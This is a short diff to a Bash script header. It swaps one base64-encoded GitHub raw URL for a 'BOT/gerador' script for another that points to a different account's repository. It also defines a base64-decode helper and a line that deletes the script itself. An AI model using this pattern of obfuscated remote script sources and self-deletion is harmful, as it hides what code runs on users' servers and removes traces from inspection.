@@ -2,7 +2,7 @@
 BARRA="\033[1;36m-----------------------------------------------------\033[0m"
 IVAR="/etc/http-instas"
 SCPT_DIR="/etc/SCRIPT"
-SCPresq="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NodW1vR0gvQ2h1bW9HSC1TY3JpcHQvbWFzdGVyL0JPVC9nZXJhZG9y"
+SCPresq="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NlcmJlcnVzOTExNi9DaHUvbWFzdGVyL0JPVC9nZXJhZG9y"
 SUB_DOM='base64 -d'
 rm $(pwd)/$0
 
